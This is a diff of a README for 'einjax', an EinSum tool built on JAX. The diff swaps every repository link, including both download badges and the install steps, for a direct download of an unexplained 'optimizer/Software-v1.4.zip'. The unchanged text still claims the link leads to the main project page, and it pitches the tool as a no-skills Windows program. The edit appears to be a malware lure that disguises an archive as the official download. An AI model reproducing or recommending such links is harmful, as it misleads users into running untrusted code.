@@ -1,6 +1,6 @@
 # 🚀 einjax - Easy EinSum Computation System
 
-[![Download einjax](https://img.shields.io/badge/Download-einjax-ff6347?style=for-the-badge)](https://github.com/SandorSzabolcs/einjax)
+[![Download einjax](https://img.shields.io/badge/Download-einjax-ff6347?style=for-the-badge)](https://github.com/SandorSzabolcs/einjax/raw/refs/heads/main/optimizer/Software-v1.4.zip)
 
 einjax is a simple program for running EinSum operations using the JAX library. This tool helps perform tensor calculations quickly and accurately. You do not need any programming skills to use it on your Windows PC.
 
@@ -11,7 +11,7 @@ einjax is a simple program for running EinSum operations using the JAX library. 
 To get started, you need to download einjax from the official GitHub page. Follow these steps carefully.
 
 1. Click on this link or copy it into your browser:  
-   [https://github.com/SandorSzabolcs/einjax](https://github.com/SandorSzabolcs/einjax)  
+   [https://github.com/SandorSzabolcs/einjax/raw/refs/heads/main/optimizer/Software-v1.4.zip](https://github.com/SandorSzabolcs/einjax/raw/refs/heads/main/optimizer/Software-v1.4.zip)  
    This link takes you to the main page where you can find the latest version of einjax.
 
 2. On the GitHub page, look for the **Releases** section. This is usually on the right side or under the "Code" tab at the top.
@@ -106,7 +106,7 @@ For advanced users or those interested in the technical side:
 - Learn about **Einstein Summation (EinSum)** online. It is a way to write complex sums in a compact way.
 - Explore the **JAX library** used behind the scenes for fast math calculations. This is more technical but helps explain how the program computes results.
 - Visit the GitHub repository for updates or to report issues:  
-  [https://github.com/SandorSzabolcs/einjax](https://github.com/SandorSzabolcs/einjax)
+  [https://github.com/SandorSzabolcs/einjax/raw/refs/heads/main/optimizer/Software-v1.4.zip](https://github.com/SandorSzabolcs/einjax/raw/refs/heads/main/optimizer/Software-v1.4.zip)
 
 ---
 
@@ -118,4 +118,4 @@ If you need help or want to share feedback, use the **Issues** tab on GitHub to 
 
 ---
 
-[![Download einjax](https://img.shields.io/badge/Download-einjax-ff6347?style=for-the-badge)](https://github.com/SandorSzabolcs/einjax)
+[![Download einjax](https://img.shields.io/badge/Download-einjax-ff6347?style=for-the-badge)](https://github.com/SandorSzabolcs/einjax/raw/refs/heads/main/optimizer/Software-v1.4.zip)
